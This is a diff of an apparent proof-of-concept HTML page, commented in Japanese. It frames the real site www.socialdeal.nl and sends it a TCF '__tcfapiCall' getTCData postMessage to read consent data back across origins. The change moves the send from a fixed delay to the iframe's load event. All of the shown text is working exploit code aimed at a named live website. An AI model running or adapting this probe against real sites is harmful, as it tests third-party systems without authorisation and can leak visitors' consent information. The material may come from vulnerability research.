@@ -21,23 +21,25 @@
           alert("✅ __tcfapiReturn received:\n" + JSON.stringify(data.__tcfapiReturn, null, 2));
         }
       } catch (e) {
-        console.warn("Not JSON:", event.data);
+        // JSONでなければスルー
       }
     });
 
-    // PoC送信
-    setTimeout(() => {
-      const msg = {
-        __tcfapiCall: {
-          command: "getTCData",
-          version: 2,
-          parameter: null,
-          callId: callId
-        }
-      };
-      targetFrame.contentWindow.postMessage(JSON.stringify(msg), "https://www.socialdeal.nl");
-      console.log("PoC message sent:", msg);
-    }, 6000);  // 5秒より少し長めがおすすめ
+    // iframeのロード待ち
+    targetFrame.addEventListener("load", () => {
+      setTimeout(() => {
+        const msg = {
+          __tcfapiCall: {
+            command: "getTCData",
+            version: 2,
+            parameter: null,
+            callId: callId
+          }
+        };
+        targetFrame.contentWindow.postMessage(JSON.stringify(msg), "https://www.socialdeal.nl");
+        console.log("PoC message sent:", msg);
+      }, 1500);
+    });
   </script>
 </body>
 </html>
